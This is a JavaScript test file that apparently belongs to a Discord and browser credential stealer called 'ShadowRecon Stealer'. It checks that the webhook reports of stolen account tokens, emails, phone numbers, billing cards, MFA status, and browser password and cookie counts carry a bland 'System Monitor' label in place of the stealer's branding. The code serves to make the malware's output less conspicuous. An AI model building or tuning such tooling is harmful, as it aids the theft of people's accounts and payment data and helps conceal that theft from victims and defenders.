/**
 * Test to verify the Discord embed footer fix
 */

const { EmbedBuilder } = require('../../src/core/embedBuilder');

describe('EmbedBuilder Footer Fix', () => {
    test('should use subtle footer text instead of obvious branding', () => {
        const testAccount = {
            id: '123456789',
            username: 'TestUser',
            discriminator: '1234',
            tag: 'TestUser#1234',
            email: 'test@example.com',
            phone: '+1234567890',
            verified: true,
            mfaEnabled: false,
            avatar: 'avatar_hash',
            bio: 'Test bio',
            nitro: 'Nitro Boost',
            badges: ['Discord Staff'],
            billings: [{ brand: 'Visa', last4: '1234' }],
            locale: 'en-US',
            flags: 1,
            token: 'test_token'
        };

        const accountEmbed = EmbedBuilder.createAccountEmbed(testAccount, '192.168.1.100');
        
        // Footer should be subtle, not obvious
        expect(accountEmbed.footer.text).toBe('System Monitor');
        expect(accountEmbed.footer.text).not.toBe('ShadowRecon Stealer');
        
        // Should maintain all other functionality
        expect(accountEmbed.fields).toHaveLength(8);
        expect(accountEmbed.timestamp).toBeDefined();
        expect(accountEmbed.author.name).toBe('TestUser (123456789)');
    });

    test('should use subtle system embed title', () => {
        const systemInfo = {
            username: 'TestUser',
            hostname: 'TestPC',
            ip: '192.168.1.100'
        };

        const stats = {
            browsers: {
                passwords: 50,
                cookies: 200
            }
        };

        const systemEmbed = EmbedBuilder.createSystemEmbed(systemInfo, stats);
        
        // Title should be subtle
        expect(systemEmbed.title).toBe('System Information');
        expect(systemEmbed.title).not.toBe('ShadowRecon | System Info');
        
        // Footer should also be subtle
        expect(systemEmbed.footer.text).toBe('System Monitor');
    });

    test('should maintain file embed functionality with subtle footer', () => {
        const fileEmbed = EmbedBuilder.createFileEmbed('192.168.1.100', 'https://example.com/file.zip', 'password123');
        
        expect(fileEmbed.footer.text).toBe('System Monitor');
        expect(fileEmbed.title).toBe(':package: File Download');
        expect(fileEmbed.fields).toHaveLength(4);
    });
});